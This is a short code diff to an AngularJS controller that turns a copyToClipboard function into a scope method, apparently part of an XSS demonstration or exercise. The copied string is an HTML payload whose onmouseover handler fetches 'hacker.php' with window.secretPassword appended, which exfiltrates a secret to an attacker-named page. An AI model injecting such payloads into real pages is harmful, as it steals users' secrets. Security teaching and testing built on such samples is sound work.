@@ -22,9 +22,9 @@ app.controller('Ctrl', [
   function ($scope) {
     $scope.input = '';
 
-    function copyToClipboard() {
+    $scope.copyToClipboard = function () {
       var str = `<div onmouseover="javascript:fetch('hacker.php?password=' + window.secretPassword);">MOUSE OVER ME!</div>`;
       navigator.clipboard.writeText(str);
-    }
+    };
   },
 ]);
